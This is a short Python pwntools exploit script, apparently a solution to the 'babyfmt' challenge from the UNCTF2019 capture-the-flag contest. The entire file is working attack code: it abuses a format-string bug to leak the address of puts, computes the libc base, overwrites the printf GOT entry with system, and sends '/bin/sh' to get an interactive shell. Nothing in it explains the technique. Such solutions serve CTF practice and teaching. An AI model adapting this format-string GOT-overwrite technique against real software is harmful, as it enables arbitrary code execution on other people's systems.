#!/usr/bin/env python
from pwn import *
context.arch="i386"
context.log_level = "debug"
p = process("./babyfmt")
libc = ELF("/lib32/libc.so.6")
elf=ELF("./babyfmt")
offset=4
payload=p32(elf.got['puts']) + '%4$s'

p.recvuntil("Welcome to UNCTF2019!")
p.recvuntil("printf is magic function!")
p.recvuntil('Please input your message:')
p.send(payload)
puts_addr = u32(p.recv(8)[-4:])
#puts_addr = u32(p.recvuntil('\x7f')[-4:])
log.success('puts_addr'+hex(puts_addr))

#raw_input("##")
libcbase= puts_addr - libc.symbols['puts']
print "libcbase:"+hex(libcbase)
system_addr = libcbase+libc.symbols['system']
print "system_addr"+str(system_addr)+","+hex(system_addr)
payload=fmtstr_payload(offset,{elf.got['printf']:system_addr})
print payload
p.recvuntil('Please input your message:')
p.sendline(payload)
raw_input("##")
payload="/bin/sh\x00"
p.sendline(payload)

p.interactive()

